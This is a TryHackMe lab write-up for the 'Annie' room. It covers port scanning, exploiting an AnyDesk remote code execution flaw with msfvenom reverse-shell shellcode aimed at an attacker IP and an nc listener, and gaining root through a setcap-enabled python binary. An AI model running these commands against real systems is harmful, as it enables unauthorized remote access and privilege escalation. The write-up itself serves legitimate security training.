# **_Annie TryHackMe Writeup_**
## SneakyTurtle158
## Room Creator: TobjasR
[Annie](https://tryhackme.com/room/annie)

Let's get right into it!

I always start off my enumeration on these THM machines with the threader3000 tool (mostly because waiting for a full nmap scan takes some time.)
Threader3000 is great becasue it allows for multithreaded port scanning. In a real world scenario this is a very noisy scan, so you wouldn't likely use it, but in THM boxes it's great becasue it can enumerate ports in 30-90 seconds and then will suggest an in-depth nmap scan that you can run against those specific ports. 

To use the tool you can clone it right from the repo using git:

```bash
cd /opt && git clone https://github.com/dievus/threader3000.git
cd threader3000
chmod +x threader3000.py
./threader3000.py
```

So I ran threader3000 and then did its the suggested nmap scan to get some more info:

```bash
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.48.57
------------------------------------------------------------
Scanning target 10.10.48.57
Time started: 2022-07-03 15:18:55.885442
------------------------------------------------------------
Port 22 is open
Port 7070 is open
Port 40105 is open
Port scan completed in 0:01:13.866787
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,7070,40105 -sV -sC -T4 -Pn -oA 10.10.48.57 10.10.48.57
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,7070,40105 -sV -sC -T4 -Pn -oA 10.10.48.57 10.10.48.57
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 15:20 EDT
Nmap scan report for 10.10.48.57
Host is up (0.22s latency).

PORT      STATE  SERVICE         VERSION
22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open   ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30
|_ssl-date: TLS randomness does not represent time
40105/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
```

Ok, so the first thing that caught my eye here is the AnyDesk Client running on port 7070. I've never dealt with AnyDesk so I used some quick Google Fu to try to get up to speed on it. It looks like it also commonly uses a UDP port in the 50001-50003 range so I did a quick nmap UDP scan of that port range to try to confirm what I was seeing:

```bash
┌──(root㉿kali)-[/opt/THM/annie]
└─# nmap -sU -p50001-50003 10.10.48.57
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 15:38 EDT
Nmap scan report for 10.10.48.57
Host is up (0.24s latency).

PORT      STATE         SERVICE
50001/udp open|filtered unknown
50002/udp closed        unknown
50003/udp closed        unknown
```

So, knowing that we have the AnyDesk client running on this machine, I started to search around for any potential vulnerabilities or exploits.

This pretty quickly revealed an RCE exploit on exploit-db: [AnyDesk 5.5.2 - Remote Code Execution](https://www.exploit-db.com/exploits/49613)

Now, we don't really have any way of knowing if the version of the AnyDesk client is the vulnerable version, but we are going to take a shot in the dark here and see what happens. 

First thing we have to do is make some edits to the exploit to make sure the target IP reflects our target (the port number lines up with what we saw in our UDP scan):
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/1.png">
</p>

Next, we need to update the payload of the actual exploit with our own shellcode so we will first run the msfvenom command to get our specific shellcode:
```bash
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.40.163 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/2.png">
</p>
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/3.png">
</p>

Next, we just need to set up a listener on our machine using the port we designated in the payload (in my case port 4444):
```bash
# nc -nvlp 4444
```
Then, send it!
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/4.png">
</p>

Back over on our listener, we've picked up a shell:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/5.png">
</p>

Let's clean up the shell with python's pty:
`# python3 -c 'import pty;pty.spawn("/bin/bash")'`

And we've got our first flag!
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/6.png">
</p>

Now, my next step before going crazy trying to upload LinPEAS is to just check some basic privesc stuff. I don't have annie's password so let's look for som SUID binaries:
`find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;`
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/7.png">
</p>

Looks like we have setcap so we can use this to gain root shell by adding extended permissions to the python binary on the machine:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/8.png">
</p>

Now that we've added the extended permissions, all we need to do is use our python binary to spawn a shell and we'll have root. (Make sure you are using the binary that you added the +ep to not the one located in /usr/bin)

`# ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/raw/pictures/annie/9.png">
</p>

_And that's it! Thanks for following along._